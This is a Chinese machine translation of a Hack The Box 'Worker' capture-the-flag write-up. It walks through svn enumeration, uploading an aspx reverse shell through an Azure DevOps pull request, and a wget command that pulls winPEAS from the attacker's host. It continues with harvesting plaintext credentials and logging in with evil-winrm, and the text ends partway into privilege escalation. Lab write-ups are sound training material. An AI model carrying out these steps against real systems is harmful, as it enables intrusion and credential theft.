<html>
<head>
<title>HTB Worker [writeup]</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTB工人报</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-worker-writeup-74033203b785?source=collection_archive---------2-----------------------#2021-01-30">https://infosecwriteups.com/htb-worker-writeup-74033203b785?source=collection_archive---------2-----------------------#2021-01-30</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="8e79" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">问题:打开svn端口&gt;错误配置的svn系统&gt;无限制的文件上传&gt;错误配置的设置</h2></div><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi ki"><img src="../Images/d7a3956cf4be6f6031fdb4e586a917c9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1388/format:webp/1*q8omjFWvzn6s_-dlYkLvcw.png"/></div></figure></div><div class="ab cl kq kr hx ks" role="separator"><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv"/></div><div class="im in io ip iq"><h1 id="a664" class="kx ky it bd kz la lb lc ld le lf lg lh jz li ka lj kc lk kd ll kf lm kg ln lo bi translated">摘要</h1><p id="7c5b" class="pw-post-body-paragraph lp lq it lr b ls lt ju lu lv lw jx lx ly lz ma mb mc md me mf mg mh mi mj mk im bi translated">在这台机器上，我学会了通过命令行和它的客户端应用程序从SubVersion控制系统开放端口3690检索敏感信息。</p><p id="2878" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">对于反向shell，我不得不花一些时间来理解应用程序系统是如何工作的，以及这可能如何被利用。经过一些尝试和错误，我设法得到了用户的反向外壳。</p><p id="62a9" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">故事并没有到此结束。我无法通过我得到的shell检索user.txt文件。我不得不横向升级到另一个用户来获取user.txt文件。在深入挖掘用户shell中的信息后，我终于找到了另一个用户的明文密码，我可以升级到这个密码。使用一个特殊的工具，我成功地登录到另一个用户shell并访问了user.txt散列。</p><p id="7b35" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated"><strong class="lr iu">使用的工具:</strong></p><ul class=""><li id="7c3b" class="mq mr it lr b ls ml lv mm ly ms mc mt mg mu mk mv mw mx my bi translated"><code class="fe mz na nb nc b">nmap</code></li><li id="b49d" class="mq mr it lr b ls nd lv ne ly nf mc ng mg nh mk mv mw mx my bi translated"><code class="fe mz na nb nc b">dirsearch.py</code>查找隐藏的目录和内容</li><li id="f17e" class="mq mr it lr b ls nd lv ne ly nf mc ng mg nh mk mv mw mx my bi translated"><code class="fe mz na nb nc b">svn info svn://10.10.10.203</code>，<code class="fe mz na nb nc b">svn list svn://10.10.10.203</code> svn这是subversion，是一个版本控制系统，用来跟踪文件和目录信息。</li><li id="e7e7" class="mq mr it lr b ls nd lv ne ly nf mc ng mg nh mk mv mw mx my bi translated"><a class="ae ni" href="https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx" rel="noopener ugc nofollow" target="_blank"> aspx反向外壳脚本</a></li><li id="dc46" class="mq mr it lr b ls nd lv ne ly nf mc ng mg nh mk mv mw mx my bi translated"><a class="ae ni" href="https://github.com/Hackplayers/evil-winrm" rel="noopener ugc nofollow" target="_blank"> Evil-winrm </a>是一款windows远程管理工具，是一款测试工具。这用于登录用户以获取外壳。</li></ul><p id="25dd" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated"><strong class="lr iu"> CVE(有):</strong>无</p></div><div class="ab cl kq kr hx ks" role="separator"><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv"/></div><div class="im in io ip iq"><h1 id="c484" class="kx ky it bd kz la lb lc ld le lf lg lh jz li ka lj kc lk kd ll kf lm kg ln lo bi translated">列举</h1><p id="aa30" class="pw-post-body-paragraph lp lq it lr b ls lt ju lu lv lw jx lx ly lz ma mb mc md me mf mg mh mi mj mk im bi translated">Nmap扫描TCP输出</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nj"><img src="../Images/0dfc699eb6de27d6705f8b93d8111f45.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1-frQ78G2GaWLZxpIPKNxw.png"/></div></div></figure></div><div class="ab cl kq kr hx ks" role="separator"><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv"/></div><div class="im in io ip iq"><h1 id="29d5" class="kx ky it bd kz la lb lc ld le lf lg lh jz li ka lj kc lk kd ll kf lm kg ln lo bi translated">据点</h1><p id="372a" class="pw-post-body-paragraph lp lq it lr b ls lt ju lu lv lw jx lx ly lz ma mb mc md me mf mg mh mi mj mk im bi translated"><strong class="lr iu">* * * * * * * * * * * *端口3690服务器颠覆* * * * * * * * * * * * * * * * * * * * * * * * * * *</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi no"><img src="../Images/f57c17883d50bc896f840c2867d5c1bf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cfe3bY6GXHJlcsacbJL9Rg.png"/></div></div></figure><p id="45b9" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">在研究svnserver时，我遇到了一个<code class="fe mz na nb nc b">svn</code>命令，然后我用它来提取关于这个站点的有用信息。这是可能的，因为没有适当的认证。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi np"><img src="../Images/1629c86dd74b57189ca4f95de95c78f1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FIleVIXVlBgtoUgklvuJpQ.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nq"><img src="../Images/04aa013c10064c02f1922873c5f9926f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XTVURj3M4j-7kkTRlqRrDg.png"/></div></div></figure><p id="e631" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">日志显示有带注释的5r(修订)文件。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nr"><img src="../Images/735eccda6d8814a6b4da4183f8d5f8db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WSi4yyWy9eK3UoLolW3aUg.png"/></div></div></figure><p id="f4ea" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated"><code class="fe mz na nb nc b">svn list</code>命令显示了最新的R5信息。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nq"><img src="../Images/67615a7a3ae03f96ff93a88859af8ad3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*32uQxFSmKnWH-m_j1PSSCw.png"/></div></div></figure><p id="a243" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">使用<code class="fe mz na nb nc b">svn list</code>命令，我们可以看到子域名。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ns"><img src="../Images/ecd562b93bd9c559f2873d8a67cb69a5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*erQHm1rSj559zSIej02U4A.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nt"><img src="../Images/29bf48d6f3306415a0cbff215aeb478b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*C1g1yp4r13IYuxtOCLv3Bg.png"/></div></div></figure><p id="7057" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">使用名为<strong class="lr iu"> smartsvnprofessional的svn GUI客户端应用程序，</strong>我检查了我们之前在log中看到的所有5个修订文件。</p><p id="8b8c" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">在这里，我还获得了对<strong class="lr iu"> moved.txt </strong>及其内容的访问权限。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nu"><img src="../Images/ff3889d54b717baf92e3b4c290e4433f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*d_Wd6j7jQsymEph3K7lNdw.png"/></div></div></figure><div class="kj kk kl km gt ab cb"><figure class="nv kn nw nx ny nz oa paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><img src="../Images/e33e75ccbb286a9bb92967b95beedae3.png" data-original-src="https://miro.medium.com/v2/resize:fit:996/format:webp/1*gG4dzvQ40rmcU_MTT_Yjqg.png"/></div></figure><figure class="nv kn ob nx ny nz oa paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><img src="../Images/60d2f3d285a0d8950c63b46045466bbb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1006/format:webp/1*eBUgjGC8DKjQq8c_s7HyLg.png"/></div></figure></div><p id="3108" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">找到一个名为<em class="oc"> devops.worker.htb </em>的新子域名，并将其包含到我的<em class="oc"> /etc/hosts </em>文件中。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi od"><img src="../Images/5d01ceca9e9b11be6a15010dc9ed7085.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*b7yvFppGJsdn4gPRJ1CbDQ.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi oe"><img src="../Images/81e5f38f215efe9a64a855cac843dd19.png" data-original-src="https://miro.medium.com/v2/resize:fit:1232/format:webp/1*vICsm_oijEn-ids5aaI8XQ.png"/></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi of"><img src="../Images/4324d21dbab1995cfb1a58f3ea875c79.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rE43mYpj9ooM7pQj4PmgdQ.png"/></div></div><figcaption class="og oh gj gh gi oi oj bd b be z dk translated">访问此子域需要凭据。</figcaption></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ok"><img src="../Images/ed8e1222f75600e651b2d532596da913.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-mU2W04FkRUSbOLuvSGE6g.png"/></div></div></figure><p id="dd9d" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">注意之前我运行<code class="fe mz na nb nc b">svn log </code>命令时，r2的注释提到了<em class="oc">‘添加的部署脚本’</em>。</p><p id="3441" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">通过更新工作副本，将当前版本从r5更改为r2，如下所示，因为我们希望从<strong class="lr iu"> r2检索<strong class="lr iu">部署脚本</strong>。</strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ol"><img src="../Images/efd2f205cf101357e08bd96cb614a4d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JXI8JfmKy2NXzxVgGwxKrg.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi om"><img src="../Images/b4cf9357f430ee07482489c14d0ed9e0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PdZwclioJipr6MBZebrXYA.png"/></div></div></figure><div class="kj kk kl km gt ab cb"><figure class="nv kn on nx ny nz oa paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><img src="../Images/5b07e382ccd5318674d74e89e33275b9.png" data-original-src="https://miro.medium.com/v2/resize:fit:834/format:webp/1*PaDTch9WxyyuspWU-DCgpg.png"/></div></figure><figure class="nv kn oo nx ny nz oa paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><img src="../Images/9909246cfb5d9d95045217f3fafbdf70.png" data-original-src="https://miro.medium.com/v2/resize:fit:1168/format:webp/1*qVKHhroAhRSTVOx7mU1mkQ.png"/></div></figure></div><p id="abbc" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated"><strong class="lr iu">问题</strong></p><p id="cea7" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">现在，我使用这些凭据，尝试登录<em class="oc"> devops.worker.htb </em>登录门户，但即使尝试了几次也没有成功。</p><p id="7608" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">后来，通过一些指点，我意识到我必须将“手动代理配置”改为“使用系统代理设置”，即使打嗝拦截功能已经关闭。进入<em class="oc"> devops.worker.htb </em>的认证运行良好，我获得了立足点！！！</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi op"><img src="../Images/4e4cf2b8ea68af95bc81a7a3ab149128.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NjjjCQpPVv1AbZWUoBxsrw.png"/></div></div></figure></div><div class="ab cl kq kr hx ks" role="separator"><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv"/></div><div class="im in io ip iq"><h1 id="fd7b" class="kx ky it bd kz la lb lc ld le lf lg lh jz li ka lj kc lk kd ll kf lm kg ln lo bi translated">反向外壳</h1><p id="2ae8" class="pw-post-body-paragraph lp lq it lr b ls lt ju lu lv lw jx lx ly lz ma mb mc md me mf mg mh mi mj mk im bi translated">在花了一些时间浏览这个网站并从HTB社区得到一些指点后，我明白了得到反向外壳的过程。</p><ol class=""><li id="5dfc" class="mq mr it lr b ls ml lv mm ly ms mc mt mg mu mk oq mw mx my bi translated">访问项目<em class="oc">smarthotel 360&gt;Repos&gt;文件&gt;光谱&gt;创建新分支</em></li></ol><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi or"><img src="../Images/7e1c9234ed0981910200b0e430899607.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wvHQQEJLuTSgfGeSkoRLcw.png"/></div></div></figure><p id="964d" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">2.由于这是在微软Windows IIS服务器上运行的，我上传了我下载的由<a class="ae ni" href="https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx" rel="noopener ugc nofollow" target="_blank"> borjmz </a>编写的aspx反向shell脚本，并更改了IP地址和监听端口。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi os"><img src="../Images/5bd2c9084fe17e9c0e297b04546b0a82.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-BbfWVXlcaQxm9Lq8Avy6A.png"/></div></div></figure><p id="7aa6" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">3.上传reverse.aspx shell后，单击“创建拉取请求”。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ot"><img src="../Images/563dbb570ce63d599dd889b71d56e7a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HKOskjTVfdIP6JXMR_EHqQ.png"/></div></div></figure><p id="d7fd" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">4.批准并完成合并。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nt"><img src="../Images/cc5b2fea33451a71ca5cbf91176bb422.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tLufG2qhKZpXOopSk-YxAg.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ou"><img src="../Images/5145cc880aedc5b861653246f7956652.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QMR-nOiPiiFgD57G7plkAw.png"/></div></div></figure><p id="6bcb" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">现在，所有必需的项目都已完成，请执行步骤5。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div class="gh gi ov"><img src="../Images/4a79df9451ef79ff063db2162513974a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1216/format:webp/1*Xn-rjFw4T54jYULOFOvjbg.png"/></div></figure><p id="1df6" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">5.将<strong class="lr iu"/><em class="oc">spectral . worker . htb</em>包含在<em class="oc"> /etc/hosts </em>文件中，并检查url以查看它是否工作，因为我们需要在这个子域上执行<em class="oc"> reverse.aspx </em> shell。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nt"><img src="../Images/b8360c9fea8436b728d486e3688e0fcf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EIMLowTrCkLZjklWv3cdyw.png"/></div></div></figure><p id="98d7" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">6.启动主机上的监听端口并执行shell</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ow"><img src="../Images/8d2598678156611bf2c28e6dbbf454df.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mh_1O3ninM45t82aL5NvZg.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ox"><img src="../Images/82d81912dde0d016a3741d4c1416d6a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*TN9QE8R0lemomVNRtSMlkw.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi oy"><img src="../Images/2eaadd599c3543c37bfd9a71fc9f74c3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*066KP0vD3iv9lCoYwVrVfw.png"/></div></div><figcaption class="og oh gj gh gi oi oj bd b be z dk translated"><strong class="bd kz">用户</strong></figcaption></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi oz"><img src="../Images/f1ac1bc2110968d413678034b03a1496.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ECz8on_H6YuBaNma2rRzhQ.png"/></div></div></figure></div><div class="ab cl kq kr hx ks" role="separator"><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv"/></div><div class="im in io ip iq"><h2 id="1268" class="pa ky it bd kz pb pc dn ld pd pe dp lh ly pf pg lj mc ph pi ll mg pj pk ln pl bi translated">横向运动</h2><p id="d66e" class="pw-post-body-paragraph lp lq it lr b ls lt ju lu lv lw jx lx ly lz ma mb mc md me mf mg mh mi mj mk im bi translated">从在shell上运行powershell.exe命令开始，这很有效！</p><p id="5c91" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">运行powerup.ps1，然后运行Invoke-AllChecks，没有获取任何信息。</p><p id="8811" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">然后我通过<em class="oc"> /temp </em>目录下的<code class="fe mz na nb nc b">wget</code>命令下载了winpeas.exe。</p><p id="0ecd" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated"><code class="fe mz na nb nc b">wget <a class="ae ni" href="http://10.10.14.42/privilege-escalation-awesome-scripts-suite-master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe" rel="noopener ugc nofollow" target="_blank">http://10.10.14.42/privilege-escalation-awesome-scripts-suite-master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe</a> -o winPEAS.exe</code></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pm"><img src="../Images/bee4269e2a770043ec8983c291022ee3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VPmrEzGzTiLmmRBTmUTijg.png"/></div></div></figure><p id="4a9f" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">接下来，更改winPEAS.exe文件权限，然后将这个程序输出到文件中。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pn"><img src="../Images/afee0768476a5ecd9adcb9e9e871414d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QoWV_01EaNOgZeUXaRvBWA.png"/></div></div></figure><p id="2d25" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">在仔细分析了winpeas.exe的输出后，我发现还有另一个驱动器<strong class="lr iu"> W:\ </strong></p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi po"><img src="../Images/777ffb991c7ecd53932810e8355bbfbe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iG-k3TEoujhtKmi6Jo819A.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pp"><img src="../Images/d8bd76453141d3e48d7d0593d1b2a28f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HwURWCk56fhSuIrapvTGjA.png"/></div></div></figure><p id="8c01" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">在这里，我遇到了用户和他们的信用。</p><p id="1960" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">现在回到我们之前的C:\Users，我们看到了名称robisl。因此，我们现在可以尝试使用找到的密码登录。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pq"><img src="../Images/b10b8352a1d3f5c670b16e0847b8a745.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7DPeC5FTfX-a6nnauSFznQ.png"/></div></div></figure><p id="f065" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">我被指引使用一个叫做<strong class="lr iu">‘evil-winrm . Rb’</strong>的工具，这个工具可以让我们得到用户账户的外壳。</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi pr"><img src="../Images/74a934eb533d7ac245af1e1fd48af93e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ql1piqVm5w7C-ZUoVAFD2Q.png"/></div></div></figure><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ou"><img src="../Images/442a57e453fdde1351456c71e8864b39.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SdKrfqww0DtJrD2_AYiHvw.png"/></div></div><figcaption class="og oh gj gh gi oi oj bd b be z dk translated"><strong class="bd kz">成功！！！</strong></figcaption></figure></div><div class="ab cl kq kr hx ks" role="separator"><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv"/></div><div class="im in io ip iq"><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ps"><img src="../Images/b8bc1cfd895fcd79a8eef096cf2ac31b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yHG5XuBG08o3jkqBmocJoQ.png"/></div></div></figure></div><div class="ab cl kq kr hx ks" role="separator"><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv"/></div><div class="im in io ip iq"><h1 id="f57d" class="kx ky it bd kz la lb lc ld le lf lg lh jz li ka lj kc lk kd ll kf lm kg ln lo bi translated">补救</h1><ul class=""><li id="6224" class="mq mr it lr b ls lt lv lw ly pt mc pu mg pv mk mv mw mx my bi translated">关闭svn端口</li><li id="f209" class="mq mr it lr b ls nd lv ne ly nf mc ng mg nh mk mv mw mx my bi translated">配置版本控制系统，使旧版本文件一旦被移除/删除就无法恢复。</li></ul></div><div class="ab cl kq kr hx ks" role="separator"><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv"/></div><div class="im in io ip iq"><h1 id="0cb1" class="kx ky it bd kz la lb lc ld le lf lg lh jz li ka lj kc lk kd ll kf lm kg ln lo bi translated">HTB工人根</h1><p id="922a" class="pw-post-body-paragraph lp lq it lr b ls lt ju lu lv lw jx lx ly lz ma mb mc md me mf mg mh mi mj mk im bi translated">错误配置的设置</p><h1 id="6fc1" class="kx ky it bd kz la pw lc ld le px lg lh jz py ka lj kc pz kd ll kf qa kg ln lo bi translated">摘要</h1><p id="b021" class="pw-post-body-paragraph lp lq it lr b ls lt ju lu lv lw jx lx ly lz ma mb mc md me mf mg mh mi mj mk im bi translated">对于这一部分，我们回到找到robisl的密码的地方，因为<code class="fe mz na nb nc b">whoami /All</code>命令显示robisl也在一个经过身份验证的用户组中。因此，登录<em class="oc"> devops.worker.htb </em>会将我们带入他的帐户。</p><p id="9f9c" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">项目设置被错误配置为允许管理员权限。利用这一点将获得根内容，甚至更好，外壳！</p></div><div class="ab cl kq kr hx ks" role="separator"><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv kw"/><span class="kt bw bk ku kv"/></div><div class="im in io ip iq"><h2 id="1452" class="pa ky it bd kz pb pc dn ld pd pe dp lh ly pf pg lj mc ph pi ll mg pj pk ln pl bi translated">权限提升</h2><p id="a551" class="pw-post-body-paragraph lp lq it lr b ls lt ju lu lv lw jx lx ly lz ma mb mc md me mf mg mh mi mj mk im bi translated">在这里，我们可以看到robisl也是authenticated users的成员。</p><p id="a795" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">使用robisl的凭据成功登录devops.worker.htb，</p><figure class="kj kk kl km gt kn gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi qb"><img src="../Images/b09ad3a3ed144751e809f2b2916810ba.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ei4RDkFEe2Yi1OhPZqpqHg.png"/></div></div></figure><p id="a7bb" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">在使用robisl的凭证登录后，我们现在看到一个名为'<strong class="lr iu"> PartsUnlimited </strong>'的不同项目。</p><p id="00c7" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi translated">与之前不同，这里创建一个分支并合并上传的内容这次显然没有成功。</p><p id="1313" class="pw-post-body-paragraph lp lq it lr b ls ml ju lu lv mm jx lx ly mn ma mb mc mo me mf mg mp mi mj mk im bi 